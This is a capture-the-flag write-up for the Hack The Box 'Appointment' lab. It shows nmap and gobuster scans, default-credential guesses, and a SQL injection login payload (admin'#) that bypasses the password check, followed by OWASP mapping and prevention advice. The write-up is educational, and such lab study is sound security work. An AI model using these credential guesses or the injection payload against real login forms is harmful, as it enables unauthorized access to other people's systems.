# Hack The Box - Appointment (Writeup)

## 🧠 Overview

The *Appointment* machine focuses on **web application security**, specifically:

* SQL Injection
* Authentication bypass
* Basic enumeration

---

## 🔍 Step 1: Enumeration

### Nmap Scan

```bash
nmap -sC -sV <target-ip>
```

### Result:

* Port **80/tcp** open
* Service: **Apache HTTP Server 2.4.38**

👉 Indicates a **web application**

---

## 🌐 Step 2: Web Exploration

Open in browser:

```
http://<target-ip>
```

👉 Found:

* Login page with username & password fields

---

## 🔎 Step 3: Directory Enumeration

Used Gobuster:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

### Results:

* `/css`
* `/js`
* `/images`
* `/vendor`

---

## ⚠️ Observation

* `/vendor` had directory listing enabled
* Contained frontend libraries (not useful for exploitation)

👉 Conclusion:

> Enumeration did not reveal sensitive endpoints

---

## 🔐 Step 4: Authentication Testing

Tried default credentials:

```text
admin:admin
user:user
root:root
```

❌ Failed

---

## 💥 Step 5: SQL Injection Attack

Tested login form for injection.

### Payload Used:

```text
Username: admin'#
Password: anything
```

---

## 🧠 Why This Works

Backend query (example):

```sql
SELECT * FROM users 
WHERE username='admin' AND password='123';
```

After injection:

```sql
SELECT * FROM users 
WHERE username='admin'#' AND password='123';
```

👉 `#` = comment
👉 Password check ignored

💥 Login bypass successful

---

## 🚀 Step 6: Gaining Access

After login:

* Redirected to admin page
* Displayed message with flag

---

## 🎯 Result

Successfully performed:

* SQL Injection
* Authentication bypass
* Gained access without password

---

## 🧠 Key Learnings

* Always test login forms for SQL injection
* Comments (`--`, `#`) can bypass authentication
* Enumeration helps but may not always give direct access
* Understanding backend logic is critical

---

## 🔐 OWASP Mapping

* **A03: Injection**
* **A07: Identification and Authentication Failures**

---

## 🛡️ Prevention

* Use parameterized queries
* Input validation & sanitization
* Avoid direct query concatenation

---

## 🏁 Conclusion

The machine demonstrates how improper input handling leads to:

> 🔴 Complete authentication bypass

A simple SQL Injection can compromise the entire system.

---
